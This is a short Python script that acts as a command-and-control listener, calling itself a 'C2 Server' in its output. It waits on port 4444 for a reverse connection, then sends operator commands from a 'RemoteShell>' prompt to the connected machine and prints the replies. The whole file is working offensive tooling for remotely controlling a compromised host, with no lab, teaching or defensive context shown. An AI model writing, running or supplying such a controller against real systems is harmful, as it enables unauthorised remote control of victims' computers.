import socket


LHOST = '0.0.0.0' 
LPORT = 4444      

def start_controller():

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((LHOST, LPORT))
    listener.listen(1)
    
    print(f"[*] C2 Server Active. Waiting for connection on port {LPORT}...")
    
    client, addr = listener.accept()
    print(f"[*] CONNECTION ESTABLISHED FROM: {addr[0]}")
    

    try:
        client.settimeout(2.0)
        print(client.recv(4096).decode())
    except:
        pass
    client.settimeout(None)

    while True:
        try:

            cmd = input("RemoteShell> ")
            if cmd.lower() in ['exit', 'quit']:
                client.close()
                break
            
            if len(cmd) > 0:
                client.send((cmd + "\n").encode())

                response = client.recv(16384).decode()
                print(response)
        except KeyboardInterrupt:
            client.close()
            break
        except Exception as e:
            print(f"Error: {e}")
            break

if __name__ == "__main__":
    start_controller()
